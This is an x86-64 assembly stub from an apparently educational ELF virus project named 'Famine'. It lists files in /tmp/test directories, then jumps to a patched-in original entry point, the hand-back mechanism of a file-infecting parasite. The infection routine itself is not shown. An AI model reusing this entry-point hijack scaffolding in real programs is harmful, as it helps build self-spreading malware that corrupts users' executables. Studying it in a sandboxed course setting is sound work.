%include "asm/header.s"

section .text
global _start

_start:
	PUSHAQ
	mov rbp, rsp
	jmp main

process_dir:
	enter 0, 0
	sub rsp, DIRENT_SIZE
	mov rax, sys_open
	mov rdi, rdi
	mov rsi, OPEN_DIR_PERMISSION
	mov rdx, 0
	syscall		; it opens the dir
	padding
	cmp rax, 0
	jl end_process_dir
	mov r12, rax
	run_through_files:
		mov rdi, r12
		lea rsi, [rsp]
		mov rdx, DIRENT_SIZE
		mov rax, sys_getdents	; it reads dir
		syscall
		padding
		cmp rax, 0
		jle close_dir
		mov rdi, 0
		lea rsi, [rsp + linux_dirent.d_name]
		mov rdx, QWORD[rsp + linux_dirent.d_off]
		mov rax, sys_write
		syscall
		padding
		jmp run_through_files
	close_dir:
	mov rax, sys_close
	mov rdi, r12
	syscall
	end_process_dir:
	leave
	ret

main:
	lea rdi, [rel dir1]
	call process_dir
	lea rdi, [rel dir2]
	call process_dir
	jmp jmp_old_entry


old_entry_sig:
	db 'old_entry'
jmp_old_entry:
	mov rdi, 0x1111111111111111
	mov rsi, 0x1111111111111111
	cmp rdi, rsi
	jne the_jump							; exit if real famine
		mov rax, 60
		mov rdi, 0
	syscall
	the_jump:
	lea rax, [rel _start]
	sub rax, rdi
	POPAQ
	jmp rdi

signature:
	db 'Famine version 1.0 (c)oded by gdelabro', 0
dir1:
	db '/tmp/test', 0
dir2:
	db '/tmp/test2', 0
end: